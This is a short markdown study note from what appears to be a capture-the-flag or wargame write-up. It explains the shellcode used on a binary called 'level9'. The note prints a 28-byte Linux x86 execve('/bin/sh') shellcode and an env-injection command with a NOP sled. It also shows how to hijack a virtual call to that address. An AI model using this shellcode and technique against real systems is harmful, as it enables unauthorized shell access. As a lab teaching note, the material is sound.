# Shellcode (level9)

**See also:** `shellcode_pas_a_pas.md` (instruction-by-instruction explanation), `concepts.md` (exploit chain, NOP sled, layout).

## Reference used

Shellcode **Linux x86 execve("/bin/sh") — 28 bytes**
- **Author:** Jean Pascal Pereira \<pereira@secbiz.de\>
- **Source:** [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)
- **Web:** http://0xffe4.org

Bytes used:
```c
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```
No "/bin/sh" string to concatenate: the shellcode builds "/bin//sh" on the stack (push).

## Concept
A **shellcode** is injected machine code (often execve("/bin/sh")). Since the level9 binary has no `system` nor "/bin/sh", we run external code.

## Where it appears (level9)
- The virtual call jumps to *(second->vptr) = *(first+4). We put at **first+4** the shellcode address (first 4 bytes of the payload).
- The shellcode is in **env**: `env -i payload=$(python -c 'print "\x90"*1000 + "<shellcode>"')`.
- Nopsled (1000×\x90) to make hitting it easier; the address (e.g. 0xbffffc63) is found in GDB with `x/200s environ`.

## Flow

```
  call edx   (edx = *(first+4) = shellcode address)
      ↓
  nopsled → shellcode execve("/bin/sh")
      ↓
  shell
```

## Mental summary
No "system" gadget in the binary → we inject code (shellcode) in the env and hijack the virtual call to that address.

## References
- Shellcode 811: https://shell-storm.org/shellcode/files/shellcode-811.html
- `execve(2)`: https://man7.org/linux/man-pages/man2/execve.2.html
